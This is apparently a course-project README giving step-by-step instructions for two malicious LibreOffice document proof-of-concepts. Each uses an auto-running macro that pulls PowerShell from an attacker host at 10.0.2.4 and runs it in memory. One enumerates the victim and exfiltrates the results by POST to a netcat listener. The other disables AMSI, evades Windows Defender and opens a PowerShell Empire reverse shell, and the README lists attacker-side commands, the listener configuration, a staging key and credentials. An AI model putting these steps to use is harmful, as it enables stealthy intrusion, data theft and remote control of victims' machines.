# Instruction for attacks
In this document are presented the instration to launch the attack with the POCEnumAndSendBackResults.odt and the POC-msf.odt file.

**NOTE: before launching the attacks make sure that the attacker machine can communicate with the victim machine and has an IP address of 10.0.2.4**


## POCEnumAndSendBackResults.odt
This document contains a macro which gets automatically executed when the document is open. The macro code downloads a PowerShell script called attackScript.ps1 from an attacker machine which gets executed in memory. This script acts as a dropper for downloading another PowerShell script called enumScript.ps1 from the attacker machine which performs some basic enumeration on the victim device. Then it encodes the result from the enumeration and sends the result back to the attacker using a POST web request. The techniques used in macro are realistic and stealthy as no artefacts are left on the disk of the victim machine.

### Steps to reproduce attacks
1) go in the POCEnumAndSendBackResults folder where powershell scripts  are located. 
```
cd /home/kali/Desktop/compsec2/POCEnumAndSendBackResults
```
2) start an http server on port 8080 using python
```
python -m http.server 8080
```
3) open a new terminal window and use nc to listen on port 443
```
nc -lvnp 443
```
4) open the POCEnumAndSendBackResults.odt file on the victim machine. You should see from the python webserver that two files get donloaded
5) go to the terminal tab with nc listening, you should have received back a POST web requiste from the victim machine with some base64 encoded data
6) decode the base64 data
```
echo 'base64EncodedData' | base64 -d
```




## POC-msf.odt
Macro3 - POC-msf.odt: This document contains a macro which gets automatically executed when the document is open. The macro code downloads a PowerShell script from an attacker machine which gets executed in memory and acts as a dropper for downloading another PowerShell script which Disable AMSI and executes a powershell-empire  reverse shell back to the attacker. The macro code and the PowerShell script are highly obfuscated to avoid that Windows Defender detecting the .odt file and macro scripts as malicious. The techniques used in macro are realistic and stealthy as everything is performed in memory (using the IEX command) leving no artifacts on the disk of the victim machine.

### Steps to reproduce attacks
1) go in the POCEnumAndSendBackResults folder where powershell scripts  are located. 
```
cd /home/kali/Desktop/compsec2/POCmsf
```
2) start an http server on port 8080 using python
```
python -m http.server 8080
```
3) open a new terminal window and start the powershell empire server 
```
sudo powershell-empire server
```
4) open the browser and go to http://localhost:1337/index.html. the credential to log in are empireadmin-password123
5) go into the listener section, a listerner called http should already exist. if it does not existe create one.
stager info (if information is not present below, leave as default):
```
type: http
name: http
host: http://10.0.2.4:8000
port: 8000
bindIp: 0.0.0.0
launcher: powershell -noP -sta -w 1 -enc 
stagingKey: q5DRvd&HF}~MGS.)#TroflKCiW/c8?>z
defaultDelay: 5
defaultJitter: 0.0
defaultLostLimit:60
defaultProfile: /admin/login.php,/news.php,/blog/article1.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Headers: Server:Microsoft-IIS/7.5
JA3_Evasion: False
cookie: PHPID
```
6) open the POC-msf.odt file on the victim machine. You should see from the python webserver that two files get downloaded
7) go to the agent tab, you should see that a new agent has been activated and a reverse shell has been established bypassing AMSI and Windows Defender
